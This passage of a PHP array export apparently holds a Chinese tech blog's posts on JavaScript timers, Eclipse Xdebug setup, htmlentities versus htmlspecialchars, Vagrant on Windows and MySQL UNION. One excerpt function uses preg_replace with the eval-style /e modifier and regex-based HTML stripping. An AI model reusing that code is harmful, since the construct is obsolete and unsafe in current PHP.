class=\\"brush:html;toolbar:false\\">&nbsp;
&lt;html&gt;&nbsp;
&lt;body&gt;&nbsp;
&lt;input&nbsp;type=&quot;text&quot;&nbsp;id=&quot;clock&quot;&nbsp;size=&quot;35&quot;&nbsp;/&gt;&nbsp;
&lt;script&nbsp;language=javascript&gt;&nbsp;
var&nbsp;int=self.setInterval(&quot;clock()&quot;,50)&nbsp;
function&nbsp;clock()&nbsp;
{&nbsp;
var&nbsp;t=new&nbsp;Date()&nbsp;
document.getElementById(&quot;clock&quot;).value=t&nbsp;
}&nbsp;
&lt;/script&gt;&nbsp;
&lt;/form&gt;&nbsp;
&lt;button&nbsp;onclick=&quot;int=window.clearInterval(int)&quot;&gt;&nbsp;
Stop&nbsp;interval&lt;/button&gt;&nbsp;
&lt;/body&gt;&nbsp;
&lt;/html&gt;</pre><p><strong>再来了解 setTimeout :</strong> <br/>1,HTML DOM setTimeout() 方法 <br/>定义和用法 <br/>setTimeout() 方法用于在指定的毫秒数后调用函数或计算表达式。 <br/>语法 <br/>setTimeout(code,millisec) <br/>参数 描述 <br/>code 必需。要调用的函数后要执行的 JavaScript 代码串。 <br/>millisec 必需。在执行代码前需等待的毫秒数。 <br/>提示和注释 <br/>提示：setTimeout() 只执行 code 一次。如果要多次调用，请使用 setInterval() 或者让 code 自身再次调用 setTimeout()。 <br/>实例,这个例子，在你点击按钮 5 秒钟后会弹出一个提示框：</p><pre class=\\"brush:html;toolbar:false\\">&nbsp;
&lt;html&gt;&nbsp;
&lt;head&gt;&nbsp;
&lt;script&nbsp;type=&quot;text/javascript&quot;&gt;&nbsp;
function&nbsp;timedMsg()&nbsp;
{&nbsp;
var&nbsp;t=setTimeout(&quot;alert(&#39;5&nbsp;seconds!&#39;)&quot;,5000)&nbsp;
}&nbsp;
&lt;/script&gt;&nbsp;
&lt;/head&gt;&nbsp;
&lt;body&gt;&nbsp;
&lt;form&gt;&nbsp;
&lt;input&nbsp;type=&quot;button&quot;&nbsp;value=&quot;Display&nbsp;timed&nbsp;alertbox!&quot;&nbsp;
onClick=&quot;timedMsg()&quot;&gt;&nbsp;
&lt;/form&gt;&nbsp;
&lt;p&gt;Click&nbsp;on&nbsp;the&nbsp;button&nbsp;above.&nbsp;An&nbsp;alert&nbsp;box&nbsp;will&nbsp;be&nbsp;
displayed&nbsp;after&nbsp;5&nbsp;seconds.&lt;/p&gt;&nbsp;
&lt;/body&gt;&nbsp;
&lt;/html&gt;</pre><p>2,HTML DOM clearTimeout() 方法 <br/>定义和用法clearTimeout() 方法可取消由 setTimeout() 方法设置的 timeout。语法clearTimeout(id_of_settimeout) <br/>参数 描述 <br/>id_of_setinterval 由 setTimeout() 返回的 ID 值。该值标识要取消的延迟执行代码块。 <br/>实例下面的例子每秒调用一次 timedCount() 函数。您也可以使用一个按钮来终止这个定时消息：</p><pre class=\\"brush:html;toolbar:false\\">&nbsp;
&lt;html&gt;&nbsp;
&lt;head&gt;&nbsp;
&lt;script&nbsp;type=&quot;text/javascript&quot;&gt;&nbsp;
var&nbsp;c=0&nbsp;
var&nbsp;t&nbsp;
function&nbsp;timedCount()&nbsp;
{&nbsp;
document.getElementById(&#39;txt&#39;).value=c&nbsp;
c=c+1&nbsp;
t=setTimeout(&quot;timedCount()&quot;,1000)&nbsp;
}&nbsp;
function&nbsp;stopCount()&nbsp;
{&nbsp;
clearTimeout(t)&nbsp;
}&nbsp;
&lt;/script&gt;&nbsp;
&lt;/head&gt;&nbsp;
&lt;body&gt;&nbsp;
&lt;form&gt;&nbsp;
&lt;input&nbsp;type=&quot;button&quot;&nbsp;value=&quot;Start&nbsp;count!&quot;&nbsp;onClick=&quot;timedCount()&quot;&gt;&nbsp;
&lt;input&nbsp;type=&quot;text&quot;&nbsp;id=&quot;txt&quot;&gt;&nbsp;
&lt;input&nbsp;type=&quot;button&quot;&nbsp;value=&quot;Stop&nbsp;count!&quot;&nbsp;onClick=&quot;stopCount()&quot;&gt;&nbsp;
&lt;/form&gt;&nbsp;
&lt;/body&gt;&nbsp;
&lt;/html&gt;</pre><p><br/></p>',
            'keyword' => 'setInterval,setTimeout',
            'sortid' => '7',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 16:05:17',
          ),
          26 => 
          array (
            'id' => '59',
            'uid' => '1',
            'title' => 'Eclipse  配置  php5.5  的  xdebug  调试功能',
            'content' => '<p>首先，是php.ini文件的配置。下载xdebug扩展文件（www.xdebug.com，我测试用的是wamp平台，已经配置了xdebug）&nbsp;，并在php.ini配置文件中添加以下内容：&nbsp; <br/>zend_extension&nbsp;= <br/>&quot;c:/wamp/bin/php/php5.5.12/zend_ext/php_xdebug-2.2.5-5.5-vc11.dll&quot;&nbsp;[xdebug] <br/>;开启远程调试&nbsp; <br/>xdebug.remote_enable&nbsp;=&nbsp;1&nbsp;xdebug.profiler_enable&nbsp;=&nbsp;off <br/>xdebug.profiler_enable_trigger&nbsp;=&nbsp;off <br/>xdebug.profiler_output_name&nbsp;=&nbsp;cachegrind.out.%t.%p&nbsp;xdebug.profiler_output_dir&nbsp;=&nbsp;&quot;c:/wamp/tmp&quot;&nbsp;xdebug.show_local_vars=0&nbsp; <br/>;开启自动跟踪 <br/>xdebug.auto_trace&nbsp;=&nbsp;1&nbsp;;开启异常跟踪 <br/>xdebug.show_exception_trace&nbsp;=&nbsp;1&nbsp;;开启异常跟踪 <br/>xdebug.remote_autostart&nbsp;=&nbsp;1&nbsp;;收集变量 <br/>xdebug.collect_vars&nbsp;=&nbsp;1&nbsp;;收集参数 <br/>xdebug.collect_params&nbsp;=&nbsp;1&nbsp;;trace输出路径 <br/>xdebug.trace_output_dir=&quot;C:/xdebug&quot;&nbsp;;以下三个分别是主机、端口、句柄&nbsp;xdebug.remote_host=&quot;localhost&quot;&nbsp;xdebug.remote_port=9000 <br/>xdebug.remote_handler=&quot;dbgp&quot;&nbsp; <br/>保存文件后，查看phpifo()信息 <br/><img src=\\"/public/upload/image/20150921/1442822421895491.png\\" title=\\"1442822421895491.png\\" alt=\\"_wk_4a13822a995c26270d055467b86dfae4_0.png\\"/><br/></p><p><img src=\\"/public/upload/image/20150921/1442822446125411.png\\" title=\\"1442822446125411.png\\" alt=\\"_wk_4a13822a995c26270d055467b86dfae4_0(1).png\\"/><br/></p><p>其次，在配置Eclipse。打开“窗口/首选项”面板 <br/><img src=\\"/public/upload/image/20150921/1442822478617850.png\\" title=\\"1442822478617850.png\\" alt=\\"_wk_4a13822a995c26270d055467b86dfae4_0(2).png\\"/><br/></p><p>上面选项是我添加好的，其参数配置如下：</p><p><img src=\\"/public/upload/image/20150921/1442822504920019.png\\" title=\\"1442822504920019.png\\" alt=\\"_wk_4a13822a995c26270d055467b86dfae4_0(3).png\\"/><br/></p><p>然后，配置debug选项：</p><p><img src=\\"/public/upload/image/20150921/1442822537700987.png\\" title=\\"1442822537700987.png\\" alt=\\"_wk_4a13822a995c26270d055467b86dfae4_0(4).png\\"/></p><p>PHP&nbsp;Server那个选项应该知道怎么配置吧，只是服务器访问的配置，很简单，就给阅者留点思考的余地吧！！ <br/>保存首选项配置后，点工具栏的调试，可以看效果了......</p><p><br/></p><p></p><p></p>',
            'keyword' => 'eclipse,xdebug,php,调试',
            'sortid' => '1',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 16:02:41',
          ),
          27 => 
          array (
            'id' => '58',
            'uid' => '1',
            'title' => 'php htmlentities和htmlspecialchars 的区别',
            'content' => '<p>很多人都以为htmlentities跟htmlspecialchars的功能是一样的，都是格式化html代码的，我以前也曾这么认为，但是今天我发现并不是这样的。</p><p>The translations performed are:</p><pre class=\\"brush:php;toolbar:false\\">&#39;&amp;&#39;&nbsp;(ampersand)&nbsp;becomes&nbsp;&#39;&amp;&#39;&nbsp;
&#39;&quot;&#39;&nbsp;(double&nbsp;quote)&nbsp;becomes&nbsp;&#39;&quot;&#39;&nbsp;when&nbsp;ENT_NOQUOTES&nbsp;is&nbsp;not&nbsp;set.&nbsp;
&#39;&#39;&#39;&nbsp;(single&nbsp;quote)&nbsp;becomes&nbsp;&#39;&#39;&#39;&nbsp;only&nbsp;when&nbsp;ENT_QUOTES&nbsp;is&nbsp;set.&nbsp;
&#39;&lt;&#39;&nbsp;(less&nbsp;than)&nbsp;becomes&nbsp;&#39;&lt;&#39;&nbsp;
&#39;&gt;&#39;&nbsp;(greater&nbsp;than)&nbsp;becomes&nbsp;&#39;&gt;&#39;</pre><p>htmlspecialchars 只转化上面这几个html代码，而 htmlentities 却会转化所有的html代码，连同里面的它无法识别的中文字符也给转化了。 <br/><br/>我们可以拿一个简单的例子来做比较：</p><pre class=\\"brush:php;toolbar:false\\">$str=&#39;&lt;a&nbsp;href=&quot;test.html&quot;&gt;测试页面&lt;/a&gt;&#39;;&nbsp;
echo&nbsp;htmlentities($str);&nbsp;
//&nbsp;&lt;a&nbsp;href=&quot;test.html&quot;&gt;²âÊÔÒ³Ãæ&lt;/a&gt;&nbsp;

$str=&#39;&lt;a&nbsp;href=&quot;test.html&quot;&gt;测试页面&lt;/a&gt;&#39;;&nbsp;
echo&nbsp;htmlspecialchars($str);&nbsp;
//&nbsp;&lt;a&nbsp;href=&quot;test.html&quot;&gt;测试页面&lt;/a&gt;</pre><p>结论是，有中文的时候，最好用 htmlspecialchars ，否则可能乱码 <br/><br/>另外参考一下这个自定义函数：</p><pre class=\\"brush:php;toolbar:false\\">function&nbsp;my_excerpt(&nbsp;$html,&nbsp;$len&nbsp;)&nbsp;{&nbsp;
//&nbsp;$html&nbsp;应包含一个&nbsp;HTML&nbsp;文档。&nbsp;
//&nbsp;本例将去掉&nbsp;HTML&nbsp;标记，javascript&nbsp;代码&nbsp;
//&nbsp;和空白字符。还会将一些通用的&nbsp;
//&nbsp;HTML&nbsp;实体转换成相应的文本。&nbsp;
$search&nbsp;=&nbsp;array&nbsp;(&quot;&#39;&lt;script[^&gt;]*?&gt;.*?&lt;/script&gt;&#39;si&quot;,&nbsp;//&nbsp;去掉&nbsp;javascript&nbsp;
&quot;&#39;&lt;[\\\\/\\\\!]*?[^&lt;&gt;]*?&gt;&#39;si&quot;,&nbsp;//&nbsp;去掉&nbsp;HTML&nbsp;标记&nbsp;
&quot;&#39;([\\\\r\\\\n])[\\\\s]+&#39;&quot;,&nbsp;//&nbsp;去掉空白字符&nbsp;
&quot;&#39;&amp;(quot|#34);&#39;i&quot;,&nbsp;//&nbsp;替换&nbsp;HTML&nbsp;实体&nbsp;
&quot;&#39;&amp;(amp|#38);&#39;i&quot;,&nbsp;
&quot;&#39;&amp;(lt|#60);&#39;i&quot;,&nbsp;
&quot;&#39;&amp;(gt|#62);&#39;i&quot;,&nbsp;
&quot;&#39;&amp;(nbsp|#160);&#39;i&quot;,&nbsp;
&quot;&#39;&amp;(iexcl|#161);&#39;i&quot;,&nbsp;
&quot;&#39;&amp;(cent|#162);&#39;i&quot;,&nbsp;
&quot;&#39;&amp;(pound|#163);&#39;i&quot;,&nbsp;
&quot;&#39;&amp;(copy|#169);&#39;i&quot;,&nbsp;
&quot;&#39;&amp;#(\\\\d+);&#39;e&quot;);&nbsp;//&nbsp;作为&nbsp;PHP&nbsp;代码运行&nbsp;
$replace&nbsp;=&nbsp;array&nbsp;(&quot;&quot;,&nbsp;
&quot;&quot;,&nbsp;
&quot;\\\\\\\\1&quot;,&nbsp;
&quot;\\\\&quot;&quot;,&nbsp;
&quot;&amp;&quot;,&nbsp;
&quot;&lt;&quot;,&nbsp;
&quot;&gt;&quot;,&nbsp;
&quot;&nbsp;&quot;,&nbsp;
chr(161),&nbsp;
chr(162),&nbsp;
chr(163),&nbsp;
chr(169),&nbsp;
&quot;chr(\\\\\\\\1)&quot;);&nbsp;
$text&nbsp;=&nbsp;preg_replace&nbsp;($search,&nbsp;$replace,&nbsp;$html);&nbsp;
$text&nbsp;=&nbsp;trim($text);&nbsp;
return&nbsp;mb_strlen($text)&nbsp;&gt;=&nbsp;$len&nbsp;?&nbsp;mb_substr($text,&nbsp;0,&nbsp;$len)&nbsp;:&nbsp;&#39;&#39;;&nbsp;
}</pre><p>htmlspecialchar()函数和htmlentities()函数类似都是把html代码转换，htmlspecialchars_decode是把转化的html的编码转换成转换回来。 <br/><br/>我们可以拿一个简单的例子来做比较：</p><pre class=\\"brush:php;toolbar:false\\">$str=&#39;&lt;a&nbsp;href=&quot;test.html&quot;&gt;测试&lt;/a&gt;&#39;;&nbsp;
$transstr&nbsp;=&nbsp;htmlspecialchars($str)&nbsp;;&nbsp;
echo&nbsp;$transstr&nbsp;.&nbsp;&quot;&lt;br&nbsp;/&gt;&quot;;&nbsp;
echo&nbsp;htmlspecialchars_decode($transstr)&quot;;</pre><p>运行上面的代码，就可以看出两者的差别了。<br/><br/>一直都知道 PHP 中的 htmlentities 和 htmlspecialchars
 函数都能把 html 中的特殊字符转换成对应的 character entity （不知道怎么翻译），也一直都知道 htmlentities 和
 htmlspecialchars 函数有区别，但是一直都用不到这两个函数，也就没去研究过到底有什么区别。 <br/><br/><br/>今天用到了，
懒得看 PHP 手册里的鸟语，觉得这种问题应该会有人用中文写过，于是 Google 关键词“htmlentities 
htmlspecialchars”，答案千篇一律。我已经司空见惯了，复制粘贴连小学生都会。经过对比发现，每篇文章大概都包含两部分： <br/><br/>第一部分是引用 PHP 手册的说明： <br/><br/>PHP 手册中对 htmlspecialchars 写道： <br/><br/>The translations performed are:</p><pre class=\\"brush:php;toolbar:false\\">‘&amp;&#39;&nbsp;(ampersand)&nbsp;becomes&nbsp;‘&amp;&#39;&nbsp;
‘&quot;&#39;&nbsp;(double&nbsp;quote)&nbsp;becomes&nbsp;‘&quot;&#39;&nbsp;when&nbsp;ENT_NOQUOTES&nbsp;is&nbsp;not&nbsp;set.&nbsp;
”&#39;&nbsp;(single&nbsp;quote)&nbsp;becomes&nbsp;‘&#39;&#39;&nbsp;only&nbsp;when&nbsp;ENT_QUOTES&nbsp;is&nbsp;set.&nbsp;
‘&lt;&#39;&nbsp;(less&nbsp;than)&nbsp;becomes&nbsp;‘&lt;&#39;&nbsp;
‘&gt;&#39;&nbsp;(greater&nbsp;than)&nbsp;becomes&nbsp;‘&gt;&#39;</pre><p>这部分无可厚非，但是第二部分的解释却并不怎么正确： <br/><br/>htmlspecialchars 只转化上面这几个html代码，而 htmlentities 却会转化所有的html代码，连同里面的它无法识别的中文字符也给转化了。 <br/><br/>我们可以拿一个简单的例子来做比较：</p><pre class=\\"brush:php;toolbar:false\\">&lt;?php&nbsp;
$str=&#39;&lt;a&nbsp;href=&quot;test.html&quot;&gt;测试页面&lt;/a&gt;&#39;;&nbsp;
echo&nbsp;htmlentities($str);&nbsp;

//&nbsp;&lt;a&nbsp;href=&quot;test.html&quot;&gt;²âÊÔÒ³Ãæ&lt;/a&gt;&nbsp;

$str=&#39;&lt;a&nbsp;href=&quot;test.html&quot;&gt;测试页面&lt;/a&gt;&#39;;&nbsp;
echo&nbsp;htmlspecialchars($str);&nbsp;
//&nbsp;&lt;a&nbsp;href=&quot;test.html&quot;&gt;测试页面&lt;/a&gt;&nbsp;

?&gt;</pre><p>结论是，有中文的时候，最好用 htmlspecialchars ，否则可能乱码。 <br/><br/>难道 htmlentities 函数只有一个参数吗？当然不是！htmlentities 还有三个可选参数，分别是 $quote_style、 $charset、 $double_encode，手册对 $charset 参数是这样描述的： <br/><br/>Defines character set used in conversion. The default character set is ISO-8859-1. <br/><br/>从上面程序输出的结果判断，$str 是 GB2312 编码的，“测试页面”几个字对应的十六进制值是： <br/><br/>B2 E2 CA D4 D2 B3 C3 E6 <br/><br/>然而却被当成 ISO-8859-1 编码来解析： <br/><br/>²âÊÔÒ³Ãæ <br/><br/>正好对应 HTML character entity 里的： <br/><br/>²âÊÔÒ³Ãæ <br/><br/>当然会被 htmlentities 转义掉，但是只要加上正确的编码作为参数，根本就不会出现所谓的中文乱码问题： <br/><br/>$str=&#39;&lt;a href=&quot;test.html&quot;&gt;测试页面&lt;/a&gt;&#39;; <br/><br/>echo htmlentities($str, ENT_COMPAT, &#39;gb2312&#39;); <br/>// &lt;a href=&quot;test.html&quot;&gt;测试页面&lt;/a&gt;三人成虎，以讹传讹。 <br/><br/>结
论：htmlentities 和 htmlspecialchars 的区别在于 htmlentities 会转化所有的 html 
character entity，而htmlspecialchars 只会转化手册上列出的几个 html character entity 
（也就是会影响 html 解析的那几个基本字符）。一般来说，使用 htmlspecialchars 转化掉基本字符就已经足够了，没有必要使用 
htmlentities。实在要使用 htmlentities 时，要注意为第三个参数传递正确的编码。</p><p><br/></p><p>文章转自：http://www.jb51.net/article/15527.htm</p>',
            'keyword' => 'php,htmlentities,htmlspecialchars',
            'sortid' => '1',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 15:51:41',
          ),
          28 => 
          array (
            'id' => '57',
            'uid' => '1',
            'title' => 'Windows 下配置 Vagrant 环境',
            'content' => '<p><a href=\\"http://www.vagrantup.com/\\">Vagrant</a>是一个基于 Ruby 的工具，用于创建和部署虚拟化开发环境。它使用 Oracle 的开源<a href=\\"https://www.virtualbox.org/\\">VirtualBox</a>虚拟化系统。</p><p>Vagrant 在快速搭建开发环境方面是很赞的，试想一个团队中，大家开发同一个东西，以前每个人都要自己搭建一套开发环境
，有了 Vagrant，你只需要搭建一份，然后分发给所有团队成员，这样大家都立刻就有完全相同的开发环境了，即便有成员在
Windows 下，也可以方便的使用 Linux 环境开发。如果团队中来了新人，也不需要手把手教他怎么搭建开发环境，给他丢一个
Box 就好了，只要他掌握了 Vagrant 的使用方法，立刻就可以融入到开发中来，而不需要费心去安装复杂的环境。</p><p>Vagrant 的跨平台的特性简直是太棒了，这都要利益于 VirtualBox 这样一款优秀的软件和 Vagrant 这些天才工程师们。</p><p>Vagrant 还支持使用<a href=\\"http://www.opscode.com/chef/\\">Chef</a>和<a href=\\"https://puppetlabs.com/\\">Puppet</a>来维护你的虚拟开发环境，不过因为我对这两个工具并不熟悉，本文中不作介绍，只简单
介绍如果在 Windows 下配置一个 Vagrant 环境。</p><h4>安装 Vagrant</h4><p>从 Vagrant 官网下载最新的 Vagrant 和对应的 VirtualBox 安装后，新建一个文件夹用来配置 Vagrant</p><p>因为使用vagrant init precise32 http://files.vagrantup.com/precise32.box命令下载 box 会比较慢，
所以最好是提前使用迅雷等工具下载好 box 放在一个文件中，然后初始化时使用本地路径，会快很多。</p><pre>vagrant&nbsp;init&nbsp;precise32&nbsp;..\\\\boxes\\\\precise32.box</pre><p>需要注意的是，这里使用本地路径时，需要使用 Windows 风格的路径，即用\\\\来作为路径分隔符。</p><p><strong>PS:</strong>可用的 Vagrant Boxes 见这里：<a href=\\"http://www.vagrantbox.es/\\">http://www.vagrantbox.es/</a></p><h4>端口转发</h4><p>Vagrant 中配置端口转发非常方便</p><pre>Vagrant.configure(&quot;2&quot;)&nbsp;do&nbsp;|config|
&nbsp;&nbsp;#&nbsp;other&nbsp;config&nbsp;here

&nbsp;&nbsp;config.vm.network&nbsp;:forwarded_port,&nbsp;guest:&nbsp;80,&nbsp;host:&nbsp;8080
end</pre><p>上面的配置会将 Vagrant 中的 80 端口和你本机的 8080 端口建立转发关系，这样你在本机访问 http://localhost:8080 
就相当于访问 Vagrant 中的 http://localhost:80 了。</p><p><strong>端口转发可以配置多组。</strong></p><h4>共享文件夹</h4><p>使用 Vagrant 有一个非常重要的一步就是共享文件夹（得益于强大的 VirtualBox）</p><p>在Vagrantfile中设置</p><pre>config.vm.synced_folder&nbsp;&quot;E:/Blog&quot;,&nbsp;&quot;/home/vagrant/Blog&quot;</pre><p>其中第一个参数E:/Blog为本机上需要共享的文件夹路径，第二个参数为 Vagrant 虚拟机中的映射路径，注意第二个参数需要
使用绝对路径，如/home/vagrant/Blog</p><h4>连接至 Vagrant</h4><p>配置好后，就可以启动虚拟机并连接到 Vagrant 了。</p><p>首先，执行vagrant up，等待片刻，vagrant 就启动好了。 ::</p><pre>e:\\\\Vagrant\\\\precise32&gt;vagrant&nbsp;reload
[default]&nbsp;Attempting&nbsp;graceful&nbsp;shutdown&nbsp;of&nbsp;VM...
[default]&nbsp;Setting&nbsp;the&nbsp;name&nbsp;of&nbsp;the&nbsp;VM...
[default]&nbsp;Clearing&nbsp;any&nbsp;previously&nbsp;set&nbsp;forwarded&nbsp;ports...
[default]&nbsp;Creating&nbsp;shared&nbsp;folders&nbsp;metadata...
[default]&nbsp;Clearing&nbsp;any&nbsp;previously&nbsp;set&nbsp;network&nbsp;interfaces...
[default]&nbsp;Preparing&nbsp;network&nbsp;interfaces&nbsp;based&nbsp;on&nbsp;configuration...
[default]&nbsp;Forwarding&nbsp;ports...
[default]&nbsp;--&nbsp;22&nbsp;=&gt;&nbsp;2222&nbsp;(adapter&nbsp;1)
[default]&nbsp;--&nbsp;5000&nbsp;=&gt;&nbsp;5000&nbsp;(adapter&nbsp;1)
[default]&nbsp;--&nbsp;3000&nbsp;=&gt;&nbsp;3000&nbsp;(adapter&nbsp;1)
[default]&nbsp;Booting&nbsp;VM...
[default]&nbsp;Waiting&nbsp;for&nbsp;VM&nbsp;to&nbsp;boot.&nbsp;This&nbsp;can&nbsp;take&nbsp;a&nbsp;few&nbsp;minutes.
[default]&nbsp;VM&nbsp;booted&nbsp;and&nbsp;ready&nbsp;for&nbsp;use!
[default]&nbsp;Configuring&nbsp;and&nbsp;enabling&nbsp;network&nbsp;interfaces...
[default]&nbsp;Mounting&nbsp;shared&nbsp;folders...
[default]&nbsp;--&nbsp;/vagrant
[default]&nbsp;--&nbsp;/home/vagrant/Blog
[default]&nbsp;--&nbsp;/home/vagrant/Notes
[default]&nbsp;--&nbsp;/home/vagrant/Projects</pre><p>如果你vagrant up后又修改了 Vagrantfile，要使之生效，需要执行vagrant reload</p><p>在 Windows 下，不能使用vagrant ssh来直接访问 vagrnat，不过该命令会告诉你如何通过 ssh 连接 vagrant ::</p><pre>e:\\\\Vagrant\\\\precise32&gt;vagrant&nbsp;ssh
`ssh`&nbsp;executable&nbsp;not&nbsp;found&nbsp;in&nbsp;any&nbsp;directories&nbsp;in&nbsp;the&nbsp;%PATH%&nbsp;variable.&nbsp;Is&nbsp;an
SSH&nbsp;client&nbsp;installed?&nbsp;Try&nbsp;installing&nbsp;Cygwin,&nbsp;MinGW&nbsp;or&nbsp;Git,&nbsp;all&nbsp;of&nbsp;which
contain&nbsp;an&nbsp;SSH&nbsp;client.&nbsp;Or&nbsp;use&nbsp;the&nbsp;PuTTY&nbsp;SSH&nbsp;client&nbsp;with&nbsp;the&nbsp;following
authentication&nbsp;information&nbsp;shown&nbsp;below:

Host:&nbsp;127.0.0.1
Port:&nbsp;2222
Username:&nbsp;vagrant
Private&nbsp;key:&nbsp;C:/Documents&nbsp;and&nbsp;Settings/greatghoul/.vagrant.d/insecure_private_key</pre><p>这样你就可以使用类似 putty 的 ssh 客户端来访问 vagrant 来进行开发了，这里极力推荐 Chrome 扩展<a href=\\"https://chrome.google.com/webstore/detail/pnhechapfaindjhompbnflcldabbghjo?utm_source=chrome-ntp-launcher\\">Secure Shell</a></p><p>

	

	</p><p>原文链接: <a href=\\"http://www.udpwork.com/redirect/11542\\" target=\\"_blank\\" title=\\"http://www.g2w.me/2013/07/vagrant-up-in-windows/\\">http://www.g2w.me/2013/07/vagrant-up-in-windows/</a></p><p><br/></p>',
            'keyword' => 'Windows,Vagrant',
            'sortid' => '6',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 15:48:38',
          ),
          29 => 
          array (
            'id' => '56',
            'uid' => '1',
            'title' => 'mysql之union',
            'content' => '<p style=\\"padding-bottom: 15px; widows: 2; text-transform: none; background-color: #ffffff; text-indent: 0px; margin: 0px; padding-left: 0px; padding-right: 0px; font: 14px/28px 宋体, &#39;Arial Narrow&#39;, arial, serif; white-space: normal; orphans: 2; letter-spacing: normal; color: #555555; word-spacing: 0px; padding-top: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;\\">今天来写写union的用法及一些需要注意的。</p><p style=\\"padding-bottom: 15px; widows: 2; text-transform: none; background-color: #ffffff; text-indent: 0px; margin: 0px; padding-left: 0px; padding-right: 0px; font: 14px/28px 宋体, &#39;Arial Narrow&#39;, arial, serif; white-space: normal; orphans: 2; letter-spacing: normal; color: #555555; word-spacing: 0px; padding-top: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;\\">&nbsp;union:联合的意思，即把两次或多次查询结果合并起来。</p><p style=\\"padding-bottom: 15px; widows: 2; text-transform: none; background-color: #ffffff; text-indent: 0px; margin: 0px; padding-left: 0px; padding-right: 0px; font: 14px/28px 宋体, &#39;Arial Narrow&#39;, arial, serif; white-space: normal; orphans: 2; letter-spacing: normal; color: #555555; word-spacing: 0px; padding-top: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;\\">&nbsp;要求：<span style=\\"margin: 0px; color: #ff0000; padding: 0px;\\">两次查询的列数必须一致</span></p><p style=\\"padding-bottom: 15px; widows: 2; text-transform: none; background-color: #ffffff; text-indent: 0px; margin: 0px; padding-left: 0px; padding-right: 0px; font: 14px/28px 宋体, &#39;Arial Narrow&#39;, arial, serif; white-space: normal; orphans: 2; letter-spacing: normal; color: #555555; word-spacing: 0px; padding-top: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;\\">&nbsp;推荐：列的类型可以不一样，但推荐查询的每一列，想对应的类型以一样</p><p style=\\"padding-bottom: 15px; widows: 2; text-transform: none; background-color: #ffffff; text-indent: 0px; margin: 0px; padding-left: 0px; padding-right: 0px; font: 14px/28px 宋体, &#39;Arial Narrow&#39;, arial, serif; white-space: normal; orphans: 2; letter-spacing: normal; color: #555555; word-spacing: 0px; padding-top: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;\\">&nbsp;可以来自多张表的数据：多次sql语句取出的列名可以不一致，<span style=\\"margin: 0px; color: #ff0000; padding: 0px;\\">此时以第一个sql语句的列名为准。</span></p><p style=\\"padding-bottom: 15px; widows: 2; text-transform: none; background-color: #ffffff; text-indent: 0px; margin: 0px; padding-left: 0px; padding-right: 0px; font: 14px/28px 宋体, &#39;Arial Narrow&#39;, arial, serif; white-space: normal; orphans: 2; letter-spacing: normal; color: #555555; word-spacing: 0px; padding-top: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;\\">&nbsp;如果不同的语句中取出的行，有完全相同(这里表示的是每个列的值都相同)，那么union会将相同的行合并，最终只保留一行。<span style=\\"margin: 0px; color: #ff0000; padding: 0px;\\">也可以这样理解，union会去掉重复的行。</span></p><p style=\\"padding-bottom: 15px; widows: 2; text-transform: none; background-color: #ffffff; text-indent: 0px; margin: 0px; padding-left: 0px; padding-right: 0px; font: 14px/28px 宋体, &#39;Arial Narrow&#39;, arial, serif; white-space: normal; orphans: 2; letter-spacing: normal; color: #555555; word-spacing: 0px; padding-top: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;\\">如果不想去掉重复的行，可以使用union all。</p><p style=\\"padding-bottom: 15px; widows: 2; text-transform: none; background-color: #ffffff; text-indent: 0px; margin: 0px; padding-left: 0px; padding-right: 0px; font: 14px/28px 宋体, &#39;Arial Narrow&#39;, arial, serif; white-space: normal; orphans: 2; letter-spacing: normal; color: #555555; word-spacing: 0px; padding-top: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;\\"><span style=\\"margin: 0px; color: #ff0000; padding: 0px;\\">&nbsp;如果子句中有order by,limit，需用括号()包起来。推荐放到所有子句之后，即对最终合并的结果来排序或筛选。</span></p><p style=\\"padding-bottom: 15px; widows: 2; text-transform: none; background-color: #ffffff; text-indent: 0px; margin: 0px; padding-left: 0px; padding-right: 0px; font: 14px/28px 宋体, &#39;Arial Narrow&#39;, arial, serif; white-space: normal; orphans: 2; letter-spacing: normal; color: #555555; word-spacing: 0px; padding-top: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;\\">如：(select * from a order by id) union (select * from b order id);</p><p style=\\"padding-bottom: 15px; widows: 2; text-transform: none; background-color: #ffffff; text-indent: 0px; margin: 0px; padding-left: 0px; padding-right: 0px; font: 14px/28px 宋体, &#39;Arial Narrow&#39;, arial, serif; white-space: normal; orphans: 2; letter-spacing: normal; color: #555555; word-spacing: 0px; padding-top: 0px; -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px;\\"><span style=\\"margin: 0px; color: #ff0000; padding: 0px;\\">在子句中，order by 需要配合limit使用才有意义。如果不配合limit使用，会被语法分析器优化分析时去除。</span></p><p><br/></p>',
            'keyword' => 'mysql,union',
            'sortid' => '4',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 15:47:39',
          ),
          30 => 
          array (
            'id' => '55',
            'uid' => '1',
            'title' => 'IIS添加MIME扩展类型及常用的MIME类型列表',
